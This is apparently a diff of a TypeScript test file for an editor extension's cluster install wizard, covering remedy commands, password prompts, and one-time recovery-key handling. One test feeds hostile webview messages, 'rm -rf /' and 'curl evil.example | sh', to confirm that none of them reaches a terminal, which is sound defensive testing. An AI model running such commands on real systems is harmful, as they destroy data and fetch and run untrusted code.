-  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
-  const h = open({ runner });
+  const h = await open({ runner: await runnerFailingWithRemedy("install.dockerAccess", remedy) });
   try {
     beginInstall(h);
-    await until(() => /data-remedy=/.test(h.html()), "the remedy control");
-    assert.match(h.html(), new RegExp(escapeForRegExp(remedy)), "the command is shown in full");
+    await until(() => /data-act="remedy"/.test(h.html()), "the remedy control");
+    assert.ok(h.html().includes(remedy), "the command is shown in full");
+    assert.match(h.html(), /needs administrator access|Run the command in a terminal, then retry/);
+    assert.doesNotMatch(h.html(), /cannot ask for your password/i, "the password was asked; it can");
   } finally {
     h.close();
   }
 });
 
 test("the command is TYPED into the terminal, never executed", async () => {
-  // THE PROPERTY THAT MATTERS. `sendText(cmd, false)` omits the newline, so a
-  // command that runs as root waits for a person to read it and press Enter.
-  // VS Code's default for that flag is TRUE -- forgetting it would mean a
-  // privileged command running the instant a button was clicked.
   const remedy = "sudo usermod -aG docker ada";
-  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
-  const h = open({ runner });
+  const h = await open({ runner: await runnerFailingWithRemedy("install.dockerAccess", remedy) });
   try {
     beginInstall(h);
-    await until(() => /data-remedy=/.test(h.html()), "the remedy control");
-
+    await until(() => /data-act="remedy"/.test(h.html()), "the remedy control");
     h.post({ type: "remedy", value: "dockerAccess" });
     await until(() => recorded.terminals.length === 1, "the terminal");
-
     const terminal = recorded.terminals[0]!;
-    assert.equal(terminal.shown, true, "an unshown terminal helps nobody");
+    assert.equal(terminal.shown, true);
     assert.deepEqual(terminal.sent, [{ text: remedy, executed: false }]);
   } finally {
     h.close();
@@ -1013,155 +1108,162 @@ test("the command is TYPED into the terminal, never executed", async () => {
 });
 
 test("the command comes from the panel's state, never from the message", async () => {
-  // THE SECURITY PROPERTY. Anything running in the webview can post any message
-  // it likes. If the command travelled on the wire, that iframe would choose
-  // what the operator is invited to run as root -- which is the same class of
-  // hole `shell:false` exists to close in the runner.
   const remedy = "sudo usermod -aG docker ada";
-  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
-  const h = open({ runner });
+  const h = await open({ runner: await runnerFailingWithRemedy("install.dockerAccess", remedy) });
   try {
     beginInstall(h);
-    await until(() => /data-remedy=/.test(h.html()), "the remedy control");
-
-    // A message naming a step that did not fail, and one carrying a command of
-    // its own choosing. Neither may reach a terminal.
+    await until(() => /data-act="remedy"/.test(h.html()), "the remedy control");
     h.post({ type: "remedy", value: "toolK3d" });
     h.post({ type: "remedy", value: "rm -rf /" });
     h.post({ type: "remedy", value: { command: "curl evil.example | sh" } });
     await new Promise((resolve) => setTimeout(resolve, 20));
-
-    assert.equal(recorded.terminals.length, 0, "no command the panel did not record may run");
+    assert.equal(recorded.terminals.length, 0);
   } finally {
     h.close();
   }
 });
 
-function escapeForRegExp(value: string): string {
-  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-}
+// -----------------------------------------------------------------------------
+// the password: asked once, and dismissing it is an answer
+// -----------------------------------------------------------------------------
+
+test("an install that cannot even be attempted says so, with the detail in the log, never stuck on Starting", async () => {
+  // THE DEFECT: the install record is read before the graph runs, and an
+  // unparseable one threw out of the run unhandled -- the page sat on
+  // "Starting" with a Cancel that had nothing to stop, for ever.
+  const h = await open({ receipt: "not a receipt" });
+  try {
+    beginInstall(h);
+    await until(() => /The install couldn&#39;t start|The install couldn't start/.test(h.html()), "the refusal");
+    const html = h.html();
+    assert.match(html, /The log has the details\./);
+    assert.deepEqual(barActs(html), ["leave"], "nothing to retry unchanged, and no Cancel of a run that is not running");
+    // The installer's own words are detail: in the log, not the notice.
+    const notice = html.slice(html.indexOf("mq-notice"), html.indexOf("run-logs"));
+    assert.doesNotMatch(notice, /receipt|ENOENT|\.json/);
+    h.post({ type: "ready" });
+    const sent = h.panel.posted.filter((m) => (m as { type?: string }).type === "log").at(-1) as
+      | { lines: { text: string; tone?: string; anchor?: boolean }[] }
+      | undefined;
+    assert.ok(sent !== undefined && sent.lines.some((l) => l.tone === "error" && l.anchor === true && /install-receipt\.json/.test(l.text)));
+  } finally {
+    h.close();
+  }
+});
+
+test("dismissing the password prompt starts nothing, and returns to the form", async () => {
+  // THE DEFECT (high): a dismissed prompt started the run anyway.
+  const h = await open({ sudoIsFree: async () => false });
+  try {
+    setNextInputBoxResult(undefined);
+    beginInstall(h);
+    await until(() => recorded.inputBoxes.length === 1, "the prompt");
+    await until(() => /data-act="begin"/.test(h.html()), "the form again");
+    assert.ok(
+      h.runner.calls.every((c) => c.capability === "install.detect"),
+      `a step ran after the prompt was dismissed: ${h.runner.calls.map((c) => c.capability).join(", ")}`,
+    );
+    assert.match(h.html(), /value="Ada"/, "with what was typed still in it");
+  } finally {
+    h.close();
+  }
+});
+
+test("the password prompt says what it is for, in the person's words", async () => {
+  const h = await open({ sudoIsFree: async () => false });
+  try {
+    setNextInputBoxResult(undefined);
+    beginInstall(h);
+    await until(() => recorded.inputBoxes.length === 1, "the prompt");
+    const box = recorded.inputBoxes[0]!;
+    assert.equal(box["title"], "MemQL needs your password");
+    assert.equal(box["placeHolder"], "Your computer password");
+    assert.doesNotMatch(String(box["prompt"]), /sudo|--/);
+  } finally {
+    h.close();
+  }
+});
 
 // -----------------------------------------------------------------------------
-// the route into ownership the install used to drop (memql#3408, memql#3906)
+// the hand-off and the done screen
 // -----------------------------------------------------------------------------
-//
-// The `enrolmentLink` step mints a single-use passkey link inside the cluster.
-// `src/install/enrolment.ts` was written to open it -- and was reachable from
-// nothing but its own test. An operator finished a successful install with no
-// way to reach the credential the install had just created for them; the URL
-// survived only in the receipt on disk, which nothing tells them about.
-//
-// The failure shape is this file's recurring one: every piece existed and was
-// individually green, and the operator's path still did not work.
-//
-// memql#3906 moved what the screen REMEMBERS. It used to hold the run's link
-// and replay it, which failed twice over: the link is single-use and expires in
-// fifteen minutes, so the button was dead by the time anyone came back to it,
-// and a run that minted none offered nothing at all. The screen now remembers
-// only that an owner ACCOUNT exists -- a durable fact -- and the button mints a
-// fresh link when pressed.
+
+test("a completed install registers the cluster, quietly, and offers one next act", async () => {
+  const h = await open({});
+  try {
+    beginInstall(h);
+    await until(() => INSTALLED.test(h.html()), "the done screen");
+    const html = h.html();
+    assert.ok(fs.existsSync(h.clustersPath), "the cluster must land in the registry");
+    assert.ok(recorded.executed.includes("memql.clusters.refresh"));
+    // THE MODAL OVER THE DONE SCREEN: select used to pop "Set up now" over
+    // this page and its one-time key. The hand-off selects quietly.
+    const select = recorded.executed.indexOf("memql.clusters.select");
+    assert.ok(select >= 0);
+    assert.equal((recorded.executedArgs[select]![0] as { quiet?: boolean }).quiet, true);
+    // One button, and Back as a quiet way off (the landing looks again).
+    assert.equal(primaries(html), 1, "exactly one primary");
+    assert.deepEqual(barActs(html), ["back", "signIn"]);
+    assert.match(html, /api\.memql\.localhost:443/);
+    assert.match(html, /https:\/\/os\.memql\.localhost\//);
+  } finally {
+    h.close();
+  }
+});
 
 async function runToDoneWithOwner(): Promise<Harness> {
-  const runner = await fakeRunner(
-    {},
-    { "install.enrolmentLink": { ownerClaimed: true, enrolmentState: "minted" } },
-  );
-  const h = open({ runner });
+  const runner = await fakeRunner({}, { "install.enrolmentLink": { ownerClaimed: true, enrolmentState: "minted" } });
+  const h = await open({ runner });
   beginInstall(h);
-  await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
+  await until(() => INSTALLED.test(h.html()), "the run to settle");
   return h;
 }
 
-test("a successful install offers to enrol against the owner it bootstrapped", async () => {
+test("an owner account to enrol against adds Set up a passkey beside Sign in", async () => {
+  // ONE NEXT ACT: Sign in. The sign-in command itself routes a fresh owner to
+  // passkey enrolment (memql#3906), so the passkey set-up is a quiet act
+  // beside it rather than a second primary.
   const h = await runToDoneWithOwner();
   try {
     const html = h.html();
-    assert.match(html, /Your cluster is ready/, "the run should have reached the done screen");
-    assert.match(
-      html,
-      /data-act="enrolPasskey"/,
-      "the done screen must offer a route to ownership. Bootstrapping an account " +
-        "with no way to sign into it leaves the operator holding nothing at the one " +
-        "moment they are ready to use the cluster",
-    );
-    assert.match(
-      html,
-      /class="primary" type="button" data-act="enrolPasskey"/,
-      "and offer it as the PRIMARY action: the account already exists and holds no " +
-        "credential, whereas the magic-link route waits on a mailbox a local cluster " +
-        "does not have",
-    );
-    assert.match(
-      html,
-      /class="secondary" type="button" data-act="signInAsOwner"/,
-      "which demotes the magic link to the fallback it now is",
-    );
+    assert.deepEqual(barActs(html), ["back", "enrolPasskey", "signIn"]);
+    assert.match(html, /class="mq-textbtn" data-act="enrolPasskey"/);
+    assert.match(html, /class="mq-btn" data-tone="primary" data-act="signIn"/);
+    h.post({ type: "enrolPasskey" });
+    await until(() => recorded.executed.includes("memql.clusters.takeOwnership"), "the enrolment");
   } finally {
     h.close();
   }
 });
 
-// The link carries a plaintext single-use bearer in its query string. Since
-// memql#3906 the panel does not hold one at all -- it is minted at click time
-// and handed straight to the opener -- so this asserts the property is intact
-// end to end rather than that one field is guarded.
-test("no enrolment credential reaches the webview, or the panel", async () => {
+test("no enrolment credential reaches the webview", async () => {
   const h = await runToDoneWithOwner();
   try {
     const html = h.html();
-    // Asserted FIRST so this cannot pass vacuously. "the token is absent" is
-    // trivially true of a screen that rendered no enrolment at all, which is
-    // exactly the state this test would otherwise keep passing against.
-    assert.match(
-      html,
-      /data-act="enrolPasskey"/,
-      "the enrolment must actually be on screen for its containment to mean anything",
-    );
-    assert.ok(
-      !html.includes("mql_enr_"),
-      "no enrolment bearer may be rendered into the page, in any form",
-    );
-    assert.ok(
-      !/href=/.test(html.slice(html.indexOf('data-act="enrolPasskey"') - 200)),
-      "the button carries no href: the host opens the URL, the page never sees one",
-    );
+    assert.match(html, /data-act="enrolPasskey"/, "the enrolment must actually be on screen");
+    assert.ok(!html.includes("mql_enr_"));
+    assert.ok(!/href=/.test(html));
   } finally {
     h.close();
   }
 });
 
-// An install whose enrolment step never ran, or ran against a cluster with no
-// account to enrol (`ownerClaimed=false`), is not a broken install. It just has
-// no button, and the magic link goes back to primary.
-test("no owner account means no button, and the magic link is primary again", async () => {
-  const runner = await fakeRunner();
-  const h = open({ runner });
+test("signed in already, the done screen's one act is MemQL OS", async () => {
+  const h = await open({ isSignedIn: () => true });
   try {
     beginInstall(h);
-    await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
-
-    const html = h.html();
-    assert.ok(
-      !/data-act="enrolPasskey"/.test(html),
-      "offering an enrolment button with no link behind it would open nothing",
-    );
-    assert.match(
-      html,
-      /class="primary" type="button" data-act="signInAsOwner"/,
-      "with no passkey to offer, signing in is the primary route again",
-    );
+    await until(() => INSTALLED.test(h.html()), "the done screen");
+    assert.deepEqual(barActs(h.html()), ["back", "openOs"]);
+    h.post({ type: "openOs" });
+    await until(() => recorded.executed.includes("memql.clusters.openConsole"), "MemQL OS");
   } finally {
     h.close();
   }
 });
 
-// -----------------------------------------------------------------------------
-// Reconnect: back in the list with nothing typed (memql#3741)
-// -----------------------------------------------------------------------------
-
-test("the reconnect card registers the cluster and never shows a form", async () => {
-  const h = open({
-    verdict: "installed-healthy",
+test("Connect to it adds the cluster with nothing typed, signs in, and claims no reachability", async () => {
+  const h = await open({
+    verdict: "installed-unreachable",
     receipt: {
       version: 1,
       graph: "install",
@@ -1182,65 +1284,38 @@ test("the reconnect card registers the cluster and never shows a form", async ()
     },
   });
   try {
-    // WAIT FOR THE CARD, which is also the honest sequence: the verdict is
-    // read asynchronously and the cards do not exist until it resolves, so an
-    // operator cannot click this before then either -- and the panel refuses
-    // the action until it can confirm the machine actually has a cluster.
-    await until(() => h.html().includes("Connect to the local cluster"), "the reconnect card");
+    await until(() => /data-value="reconnect"/.test(h.html()), "the landing");
     h.post({ type: "choose", value: "reconnect" });
-    await until(() => h.html().includes("Sign in as owner"), "the hand-off screen");
-
-    // NOT ONE INPUT. The whole action is that the machine already knows the
-    // answers, so a screen with a box on it would be the form it replaces.
-    assert.doesNotMatch(h.html(), /<input/);
-    assert.doesNotMatch(h.html(), /<select/);
-
-    // And the entry it wrote is the install's own, at the receipt's domain.
+    await until(() => /Local cluster added/.test(h.html()), "the done screen");
+    const html = h.html();
+    assert.doesNotMatch(html, /<input|<select/, "not one box");
+    // THE DEFECT: "answers at" was said of a cluster offered precisely because
+    // it was not answering.
+    assert.doesNotMatch(html, /answers at|is reachable|is running/);
     const written = fs.readFileSync(h.clustersPath, "utf8");
     assert.match(written, /name: lab/);
     assert.match(written, /endpoint: api\.lab\.example\.com:443/);
     assert.match(written, /local: true/);
+    await until(() => recorded.executed.includes("memql.clusters.signIn"), "then the sign in");
   } finally {
     h.close();
   }
 });
 
-// -----------------------------------------------------------------------------
-// The recovery key's one-time reveal (memql#4079)
-// -----------------------------------------------------------------------------
-
 const RECOVERY_KEY = `mql_rec_${"R".repeat(43)}`;
 
-/** Runs an install whose recoveryKey step reports the given state (and key). */
 async function runToDoneWithRecovery(
   state: string,
   key: string,
-  /**
-   * Passed through to `open()`. The Back and close guards (memql#4615) are the
-   * only callers that need it -- everything else reaches the done screen and
-   * stays there.
-   */
-  over: {
-    confirmDestructive?: (prompt: DestructiveConfirmation) => Promise<boolean>;
-  } = {},
+  over: { confirmDestructive?: (prompt: DestructiveConfirmation) => Promise<boolean> } = {},
 ): Promise<Harness> {
-  const runner = await fakeRunner(
-    {},
-    { "install.recoveryKey": { recoveryKey: key, recoveryKeyState: state } },
-  );
-  const h = open({ runner, ...over });
+  const runner = await fakeRunner({}, { "install.recoveryKey": { recoveryKey: key, recoveryKeyState: state } });
+  const h = await open({ runner, ...over });
   beginInstall(h);
-  await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
+  await until(() => INSTALLED.test(h.html()), "the run to settle");
   return h;
 }
 
-/**
- * A confirm that answers the same way every time and keeps what it was asked.
- *
- * Keeping the prompts is half the point: "a modal was shown" and "a modal that
- * says what is about to be destroyed was shown" are different facts, and only
- * the second one is worth having.
- */
 function answering(answer: boolean): {
   prompts: DestructiveConfirmation[];
   confirmDestructive: (prompt: DestructiveConfirmation) => Promise<boolean>;
@@ -1255,41 +1330,18 @@ function answering(answer: boolean): {
   };
 }
 
-test("the claimed recovery key is shown once, on the done screen", async () => {
-  // THE DEFECT (memql#4079). The step's description promised "show it once";
-  // memql#3908's withholding gate (tested) kept the value out of the run log
-  // and the receipt, correctly; and no display surface was ever built. A
-  // tested gate plus an untested promise equals a credential shown to no one
-  // -- the CLI's terminal made the design complete there, so CI stayed green
-  // while the extension swallowed the envelope. This is the test the promise
-  // never had.
+test("the claimed recovery key is shown once, behind Show, with Copy beside it", async () => {
   const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
   try {
-    // THE REVEAL IS A CLICK, NOT A DEFAULT (memql#4194, audit 1). The done
-    // screen offers the reveal and keeps the plaintext out of the DOM until it
-    // is asked for -- so it can sit open on a shared screen with nothing on it.
     const before = h.html();
-    assert.match(before, /Your cluster is ready/, "the run should have reached the done screen");
-    assert.ok(
-      !before.includes(RECOVERY_KEY),
-      "the plaintext must not render before the operator asks for it",
-    );
-    assert.match(before, /data-act="revealRecoveryKey"/, "the reveal must be offered");
-
+    assert.ok(!before.includes(RECOVERY_KEY), "the plaintext must not render before it is asked for");
+    assert.match(before, /data-act="revealRecoveryKey"/);
+    assert.match(before, /data-act="copyRecoveryKey"/, "and it can be copied without being shown");
+    assert.match(before, /Shown once/);
+    assert.doesNotMatch(before, /portal|hash|break-glass|minted/i);
     h.post({ type: "revealRecoveryKey" });
-    const html = h.html();
-    assert.ok(
-      html.includes(RECOVERY_KEY),
-      "the one-time reveal must reach the operator's eyes: the step claimed the key, " +
-        "which ROTATED it, so a run that shows it nowhere has destroyed the old key and " +
-        "revealed the new one to nobody",
-    );
-    assert.match(html, /shown once/i, "the block must say the value cannot be shown again");
-    assert.match(
-      html,
-      /data-act="copyRecoveryKey"/,
-      "a 47-character credential is copied, not retyped",
-    );
+    assert.ok(h.html().includes(RECOVERY_KEY));
+    assert.equal(primaries(h.html()), 1, "the reveal is not a second primary");
   } finally {
     h.close();
   }
@@ -1298,60 +1350,32 @@ test("the claimed recovery key is shown once, on the done screen", async () => {
 test("the reveal is DISPLAY, not storage: the receipt and the run log still withhold", async () => {
   const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
   try {
-    // Asserted FIRST so the containment half cannot pass vacuously against a
-    // screen that revealed nothing at all. The reveal is click-through now
-    // (memql#4194, audit 1), so the click comes first.
     h.post({ type: "revealRecoveryKey" });
-    assert.ok(h.html().includes(RECOVERY_KEY), "the reveal must be on screen");
-
-    // The receipt: written once, kept for the life of the install, read back by
-    // repair and uninstall. memql#3908's gate must hold byte-for-byte.
+    assert.ok(h.html().includes(RECOVERY_KEY));
     const receipt = fs.readFileSync(h.receiptFile, "utf8");
-    assert.ok(
-      !receipt.includes(RECOVERY_KEY),
-      "the plaintext key must never reach the install receipt",
-    );
-    assert.ok(
-      receipt.includes("[withheld: single-use credential]"),
-      "the receipt still records THAT the step produced a credential",
-    );
-
-    // The run log: every file the recorder wrote for this run.
+    assert.ok(!receipt.includes(RECOVERY_KEY));
+    assert.ok(receipt.includes("[withheld: single-use credential]"));
     const runsDir = path.join(path.dirname(h.receiptFile), "runs");
-    // Dirents rather than names + statSync: the type comes back from the one
-    // readdir call, so there is no second look-up on a path that could have
-    // changed underneath it (CodeQL js/file-system-race).
-    const runFiles = fs.readdirSync(runsDir, { recursive: true, withFileTypes: true });
     let sawWithheldKey = false;
-    for (const dirent of runFiles) {
+    for (const dirent of fs.readdirSync(runsDir, { recursive: true, withFileTypes: true })) {
       if (!dirent.isFile()) continue;
-      const file = path.join(dirent.parentPath, dirent.name);
-      const content = fs.readFileSync(file, "utf8");
-      assert.ok(
-        !content.includes(RECOVERY_KEY),
-        `the plaintext key must not reach ${path.relative(runsDir, file)}`,
-      );
+      const content = fs.readFileSync(path.join(dirent.parentPath, dirent.name), "utf8");
+      assert.ok(!content.includes(RECOVERY_KEY));
       if (content.includes("recoveryKey=[withheld: single-use credential]")) sawWithheldKey = true;
     }
-    assert.ok(sawWithheldKey, "the run log still says the step produced a credential it withheld");
+    assert.ok(sawWithheldKey);
   } finally {
     h.close();
   }
 });
 
-test("a key claimed on an earlier run renders the fact, not an empty block", async () => {
-  // What repair and upgrade find here: the credential exists, its owner holds
-  // it, and it cannot be re-revealed -- only its hash was ever stored.
+test("a key claimed on an earlier run renders the fact, and points nowhere retired", async () => {
   const h = await runToDoneWithRecovery("alreadyClaimed", "");
   try {
     const html = h.html();
-    assert.match(html, /Your cluster is ready/, "a re-run still hands off");
-    assert.match(html, /Recovery key: claimed earlier/);
-    assert.match(html, /rotate it from the portal/i);
-    assert.ok(
-      !html.includes('data-act="copyRecoveryKey"'),
-      "there is no key here to copy; a copy button would copy nothing",
-    );
+    assert.match(html, /saved during an earlier install/);
+    assert.doesNotMatch(html, /portal/i);
+    assert.ok(!html.includes('data-act="copyRecoveryKey"'));
   } finally {
     h.close();
   }
@@ -1360,274 +1384,606 @@ test("a key claimed on an earlier run renders the fact, not an empty block", asy
 test("a cluster with no owner yet says when the key will exist", async () => {
   const h = await runToDoneWithRecovery("awaitingOwner", "");
   try {
-    const html = h.html();
-    assert.match(html, /Recovery key: minted after the first sign-in/);
-    assert.ok(!html.includes('data-act="copyRecoveryKey"'));
+    assert.match(h.html(), /created after you first sign in/);
+    assert.ok(!h.html().includes('data-act="copyRecoveryKey"'));
   } finally {
     h.close();
   }
 });
-
-// -----------------------------------------------------------------------------
-// Closing the wizard mid-run (memql#4614)
-// -----------------------------------------------------------------------------
-
-/**
- * Wraps a runner so ONE capability blocks until the case lets it go.
- *
- * The seam has to be installed BEFORE `open()`, because the panel captures
- * `runner.run` by value when it builds its deps -- reassigning it afterwards
- * would leave the panel holding the unwrapped function and the gate would never
- * close.
- */
-function gateOn(
-  runner: FakeRunner,
-  capability: string,
-): { reached: () => boolean; release: () => void } {
-  let release = (): void => {};
-  const held = new Promise<void>((resolve) => {
-    release = resolve;
-  });
-  let reached = false;
-  const inner = runner.run;
-  runner.run = async (run) => {
-    if (run.capability === capability) {
-      reached = true;
-      await held;
-    }
-    return inner(run);
-  };
-  return { reached: () => reached, release };
-}
-
-test("closing the wizard mid-run aborts the run rather than orphaning it", async () => {
-  // THE DEFECT (memql#4614). `dispose()` released the sudo agent and never
-  // touched `runAbort` -- compare the Cancel handler, which aborts FIRST and
-  // transitions second. Closing the tab during a twenty-minute install
-  // therefore left the graph running HEADLESS: k3d still built a cluster,
-  // `seedBootstrap` still bootstrapped an owner, `recoveryKey` still ROTATED
-  // the break-glass credential and revealed the new plaintext into a report
-  // nobody would ever read -- and then `if (this.disposed) return` skipped the
-  // hand-off entirely, so no registry entry was written either.
-  //
-  // The operator was left with a real cluster on their machine that the editor
-  // did not know about, and whose recovery key had been generated and thrown
-  // away. Every remaining privileged step failed on top of that, because
-  // `releaseSudoAgent()` had already `fs.rm`'d the askpass socket out from
-  // under the steps still queued behind it.
-  //
-  // THE GATE IS ON A WAVE-2 CAPABILITY, not on the first one, and that is
-  // load-bearing. `install.detect` is also run by the platform probe that fires
-  // when the install card is chosen -- gating it stops the panel BEFORE
-  // `startRun` creates the AbortController, so the case would pass against the
-  // unfixed panel by never starting a run at all. `install.dockerAccess` is
-  // reached only from inside the executor, with the run in flight and the
-  // controller live, which is the state this defect is about.
-  const runner = await fakeRunner();
-  const gate = gateOn(runner, "install.dockerAccess");
-  const h = open({ runner, sudoIsFree: async () => true });
-  try {
-    beginInstall(h);
-    await until(gate.reached, "the run to reach a step inside the graph");
-
-    // The tab is closed while wave 2 is still in flight.
-    h.close();
-    gate.release();
-
-    // Let the executor come to rest: wait for the held step to land, then give
-    // the run every chance to dispatch another wave. "Nothing further happened"
-    // has no edge to wait on, so the bound is the assertion's honesty.
-    await until(
-      () => runner.calls.some((c) => c.capability === "install.dockerAccess"),
-      "the gated step to finish",
-    );
-    for (let i = 0; i < 100; i += 1) await new Promise((resolve) => setTimeout(resolve, 1));
-
-    const ran = runner.calls.map((c) => c.capability);
-    assert.ok(
-      ran.includes("install.dockerAccess"),
-      "the case must actually have got a run going, or it proves nothing",
-    );
-    // Named individually because these are what make an orphaned run expensive
-    // rather than merely untidy: system files edited, a cluster on the machine,
-    // an owner bootstrapped into it, and a rotated recovery key revealed to
-    // nobody.
-    for (const capability of [
-      "install.hostsEntries",
-      "install.nssTools",
-      "install.mkcert",
-      "k3d.up",
-      "install.seedBootstrap",
-      "install.recoveryKey",
-    ]) {
-      assert.ok(
-        !ran.includes(capability),
-        `${capability} ran after the wizard was closed: ${ran.join(", ")}`,
-      );
-    }
-  } finally {
-    h.close();
-  }
-});
-
-// -----------------------------------------------------------------------------
-// Back, one click from a one-time credential (memql#4615)
-// -----------------------------------------------------------------------------
 
 test("Back on an uncopied recovery key asks first, and a refusal changes nothing", async () => {
-  // THE DEFECT (memql#4615). `back()` deliberately destroys the plaintext, and
-  // the done screen renders Back as an ordinary secondary button in the SAME
-  // actions row as "Set up a passkey" and "Claim this cluster". Only the key's
-  // hash is stored, so one misclick permanently destroyed the cluster's
-  // break-glass credential -- with no confirmation and no "you have not copied
-  // this yet". The screen's own copy already said closing it was goodbye.
   const asked = answering(false);
   const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY, asked);
   try {
     h.post({ type: "revealRecoveryKey" });
-    assert.ok(h.html().includes(RECOVERY_KEY), "the key must be on screen for this to be a loss");
-
     h.post({ type: "back" });
     await until(() => asked.prompts.length > 0, "the confirmation");
-
     const prompt = asked.prompts[0]!;
-    assert.match(prompt.message, /recovery key/i, "the prompt must name what is about to go");
-    assert.match(
-      `${prompt.message} ${prompt.detail}`,
-      /shown exactly once|only its hash/i,
-      "and why it cannot simply be looked at again",
-    );
-    assert.match(
-      prompt.proceed,
-      /lose the key/i,
-      "the button that goes through with it states the consequence a second time",
-    );
-
-    // A REFUSAL IS A NO-OP. The operator is still on the done screen, the key
-    // is still rendered, and the Copy button is still under it -- there is
-    // nothing to undo because nothing was done.
-    assert.match(h.html(), /Your cluster is ready/, "a refusal must not leave the screen");
-    assert.ok(h.html().includes(RECOVERY_KEY), "a refusal must not destroy the key");
+    assert.match(prompt.message, /recovery key/i);
+    assert.match(prompt.detail, /can't be shown again/);
+    assert.equal(prompt.proceed, "Leave");
+    assert.match(h.html(), INSTALLED);
+    assert.ok(h.html().includes(RECOVERY_KEY));
   } finally {
     h.close();
   }
 });
 
 test("Back that is confirmed does go back, and does let go of the key", async () => {
-  // The other half: the prompt is a speed bump, not a wall. An operator who has
-  // stored the key elsewhere, or who genuinely means to abandon it, gets the
-  // transition the button has always promised.
   const asked = answering(true);
   const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY, asked);
   try {
     h.post({ type: "revealRecoveryKey" });
     h.post({ type: "back" });
-    await until(() => !/Your cluster is ready/.test(h.html()), "the landing screen");
-
-    assert.equal(asked.prompts.length, 1, "it still asked exactly once");
-    assert.ok(
-      !h.html().includes(RECOVERY_KEY),
-      "leaving the done screen lets go of the plaintext (memql#4079)",
-    );
+    await until(() => !INSTALLED.test(h.html()), "the landing");
+    assert.equal(asked.prompts.length, 1);
+    assert.ok(!h.html().includes(RECOVERY_KEY));
   } finally {
     h.close();
   }
 });
 
 test("a copy that FAILED is not a copy: Back still asks", async () => {
-  // The clipboard is a host capability that can refuse -- a headless CI box, a
-  // Wayland session with no bridge -- and the panel is loud about it for the
-  // reason `copyRecoveryKey` states: an operator who believes they copied a key
-  // they did not is worse off than one who was told to select it by hand. The
-  // flag has to agree with that sentence, so it is set on the write resolving
-  // and not on the click.
   const asked = answering(false);
   const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY, asked);
   try {
-    h.post({ type: "revealRecoveryKey" });
     h.post({ type: "copyRecoveryKey" });
-    await until(
-      () => recorded.errors.some((e) => /could not be copied/.test(e)),
-      "the clipboard refusal",
-    );
-
+    await until(() => recorded.errors.some((e) => /Couldn't copy the recovery key/.test(e)), "the refusal");
+    assert.doesNotMatch(h.html(), />Copied</, "a failed copy is not shown as copied");
     h.post({ type: "back" });
     await until(() => asked.prompts.length > 0, "the confirmation");
-    assert.match(h.html(), /Your cluster is ready/, "and the refusal still keeps the key");
   } finally {
     h.close();
   }
 });
 
-test("closing the panel on an uncopied key says the key is gone", async () => {
-  // NOT A CONFIRMATION, and it cannot be one: `WebviewPanel.onDidDispose` fires
-  // AFTER the tab is gone and VS Code offers webviews no cancellable
-  // before-close hook, so a modal here would ask permission for something that
-  // has already happened. What is left is the honest half -- say what was lost
-  // and name the one route to another key, rather than letting a break-glass
-  // credential disappear in silence.
+test("a menu does not navigate away from an uncopied recovery key", async () => {
   const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
-  h.post({ type: "revealRecoveryKey" });
-  h.close();
+  try {
+    // The Clusters "+" again, on the open panel: revealed, never re-routed.
+    AddClusterPanel.show(context(), presenceFor("absent"), {
+      diagnostics: { appendLine: () => {} },
+      clustersPath: h.clustersPath,
+      receiptFile: h.receiptFile,
+      installRoot: REPO_ROOT,
+      refreshTree: () => undefined,
+      removeRegistryEntry: async () => undefined,
+      runScript: h.runner.run,
+    }, "uninstall");
+    await new Promise((resolve) => setTimeout(resolve, 20));
+    assert.match(h.html(), INSTALLED);
+  } finally {
+    h.close();
+  }
+});
 
+test("closing the panel on an uncopied key says the key is gone, and that it can be replaced", async () => {
+  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
+  h.close();
   const warning = recorded.warnings.find((w) => /recovery key/i.test(w));
-  assert.ok(warning !== undefined, `no warning about the key: ${recorded.warnings.join(" | ")}`);
-  assert.match(warning, /rotate/i, "and it names the one way to get another");
-  assert.ok(!warning.includes(RECOVERY_KEY), "a notification is not a place to put the plaintext");
+  assert.ok(warning !== undefined);
+  assert.match(warning, /An owner can replace it later/);
+  // NO SCREEN THAT IS NOT THERE: MemQL OS has no recovery-key page, and the
+  // portal is retired. A pointer to either sends a person looking for nothing.
+  assert.doesNotMatch(warning, /portal|hash|wizard|MemQL OS|under Users/);
+  assert.ok(!warning.includes(RECOVERY_KEY));
 });
 
 test("closing a screen that is holding no plaintext says nothing", async () => {
-  // `alreadyClaimed` renders one line and no value. Warning about it would be
-  // warning about nothing, and a prompt that fires when there is nothing to
-  // lose is how the prompt that matters stops being read.
   const h = await runToDoneWithRecovery("alreadyClaimed", "");
   h.close();
-  assert.deepEqual(
-    recorded.warnings.filter((w) => /recovery key/i.test(w)),
-    [],
-    "there was no plaintext on this screen to lose",
-  );
+  assert.deepEqual(recorded.warnings.filter((w) => /recovery key/i.test(w)), []);
+});
+
+test("the reveal guard re-arms for the next run, not once per panel", async () => {
+  const asked = answering(true);
+  const runner = await fakeRunner({}, { "install.recoveryKey": { recoveryKey: RECOVERY_KEY, recoveryKeyState: "claimed" } });
+  const live = livePresence();
+  const h = await open({ runner, confirmDestructive: asked.confirmDestructive, presence: live.presence });
+  live.bind(h);
+  try {
+    beginInstall(h);
+    await until(() => INSTALLED.test(h.html()), "the first run");
+    h.post({ type: "revealRecoveryKey" });
+    assert.ok(h.html().includes(RECOVERY_KEY));
+    h.post({ type: "back" });
+    await until(() => !INSTALLED.test(h.html()), "the landing");
+    // The landing looks again, and the install left a cluster: Repair is the run now.
+    await until(() => /data-value="repair"|data-value="signIn"/.test(h.html()), "the landing's choices");
+    h.post({ type: "choose", value: "repair" });
+    await until(() => /data-act="begin"/.test(h.html()), "the repair form");
+    type(h, "ownerFirstName", "Ada");
+    type(h, "ownerLastName", "Lovelace");
+    type(h, "ownerEmail", "ada@example.com");
+    h.post({ type: "begin" });
+    await until(() => /MemQL is repaired/.test(h.html()), "the second run");
